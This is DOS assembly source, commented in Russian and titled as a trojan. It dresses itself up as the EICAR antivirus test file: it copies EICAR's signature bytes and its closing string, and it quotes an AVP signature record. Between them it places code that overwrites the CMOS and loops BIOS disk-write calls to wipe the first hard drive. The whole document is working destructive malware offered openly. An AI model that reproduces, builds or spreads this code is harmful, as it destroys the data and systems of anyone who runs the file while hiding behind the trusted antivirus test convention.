
; ИСХОДНЫЙ ТЕКСТ ТРОЯНЦА EICAR
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; добро, причиненное этим троянцем, посвящаю благу всех живых (пока) существ.

; eicar-овский штамм (avp):
;byte        cs1_size         07
;word        cs1_offs         00 00
;word        cs_word          58 35
;byte        flags            01
;dword       cs1_cs           2E DC 6B 4A
;byte        cs2_size         44
;word        cs2_offs         00 00
;dword       cs2_cs           78 B2 58 7A
;word        objn             00 00
;dword       nameo            00 00 00 00
;byte        unk[11]          0
;
;byte# 00 .. 06 07 .. .. 43h
;cs#1  <------>
;cs#2  <------------------->

                        model   tiny
                        codeseg
                        org     100h
start:
                        db      'X5O!P%@A'        ; 1st 7 bytes fixed

                        mov     al, 7Eh           ; kill cmos
                        out     70h,al
                        out     71h,al

fuckit:                 inc     cx                ; kill hd
                        inc     cx
                        mov     ax, 037Fh
                        xor     dx, dx
                        mov     dl, 80h
                        int     13h
                        jmp     fuckit

                        db '$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

                        end     start
